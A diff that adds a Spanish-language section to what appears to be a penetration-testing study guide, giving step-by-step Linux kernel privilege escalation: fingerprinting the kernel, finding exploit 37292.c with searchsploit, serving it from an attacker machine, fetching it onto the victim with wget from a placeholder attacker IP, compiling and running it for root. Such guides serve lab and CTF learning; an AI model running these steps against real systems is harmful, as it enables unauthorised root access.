@@ -111,5 +111,72 @@ Although it looks simple, please remember that a failed kernel exploit can lead 
 - Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
 - You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
 
+# Escalación de Privilegios en Linux Kernel
+
+## Paso 1: Verificar la versión del Kernel
+Para determinar la versión del kernel en uso, ejecutamos el siguiente comando:
+
+```bash
+cat /proc/version
+```
+
+## Paso 2: Identificar la distribución y versión de Linux
+Para obtener información detallada del sistema operativo, usamos:
+
+```bash
+lsb_release -a
+```
+
+Esto nos permitirá verificar la versión exacta y comprobar si existen vulnerabilidades conocidas.
+
+## Paso 3: Buscar exploits disponibles
+Usamos `searchsploit` para encontrar exploits de escalación de privilegios basados en la versión del kernel.
+
+Por ejemplo, si el kernel es `3.13.0`, ejecutamos:
+
+```bash
+searchsploit 3.13.0
+```
+
+Si encontramos un exploit relevante, lo descargamos con:
+
+```bash
+searchsploit -m linux/local/37292.c
+```
+
+## Paso 4: Transferir el exploit al sistema objetivo
+Para facilitar la transferencia del exploit, configuramos un servidor HTTP en nuestra máquina atacante:
+
+```bash
+python3 -m http.server 8080
+```
+
+En la máquina víctima, primero nos movemos al directorio `/tmp`, ya que es el único lugar donde se permite la descarga:
+
+```bash
+cd /tmp
+```
+
+Luego, descargamos el exploit con `wget`:
+
+```bash
+wget http://[IP-ATACANTE]:8080/37292.c
+```
+
+## Paso 5: Compilar y ejecutar el exploit
+Una vez transferido, compilamos el exploit:
+
+```bash
+gcc 37292.c -o exploit
+```
+
+Luego, lo ejecutamos para intentar la escalación de privilegios:
+
+```bash
+./exploit
+```
+
+Si el exploit es exitoso, obtendremos acceso como usuario root.
+  
 ---
 
